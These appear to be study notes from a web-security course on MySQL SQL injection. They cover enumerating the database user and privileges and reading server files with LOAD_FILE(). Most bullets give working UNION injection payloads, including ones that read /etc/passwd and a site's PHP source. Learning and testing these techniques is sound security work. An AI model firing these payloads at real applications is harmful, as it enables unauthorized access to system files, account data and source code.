# Privileges
---
- **Reading data is much more common than writing data,** which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation.
- For example, **==in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files==**.

## DB User
---
- First, we have to determine **which user we are within the database.**
- **==If we do have DBA privileges==**, then it is **==much more probable that we have file-read privileges==**. 
- If we do not, then **we have to check our privileges** to see what we can do.
- To be able to **==find our current DB user==**, we can use any of the following queries:
	- `SELECT USER()`
	- `SELECT CURRENT_USER()`
	- `SELECT user from mysql.user`
- Our `UNION` injection payload will be as follows:
	- `cn' UNION SELECT 1, user(), 3, 4-- -`
	- `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

## User Privileges
---
- First of all, **==we can test if we have super admin privileges==** with the following query:
	- `SELECT super_priv FROM mysql.user`
- Once again, we can use the following payload with the above query:
	- `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
- If we **==had many users within the DBMS, we can add `WHERE user=`==**
- ![[Pasted image 20251024065652.png]]
- The **==query returns `Y`, which means `YES`, indicating superuser privileges==**
- We can also **dump other privileges we have directly from the schema**, with the following query:
	- `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
![[Pasted image 20251024065731.png]]

## LOAD_FILE
---
- The **==[LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files.==** 
- The **function takes in just one argument, which is the file name**.
	- `SELECT LOAD_FILE('/etc/passwd');`
	- **Note**: **We will only be able to read the file if the OS user running MySQL has enough privileges to read it.**
- Similar to how we have been using a `UNION` injection, we can use the above query:
	- `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

### Another Example
---
- We know that the current page is **`search.php`. The default Apache webroot is `/var/www/html`**:
	- `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
- ![[Pasted image 20251024065917.png]]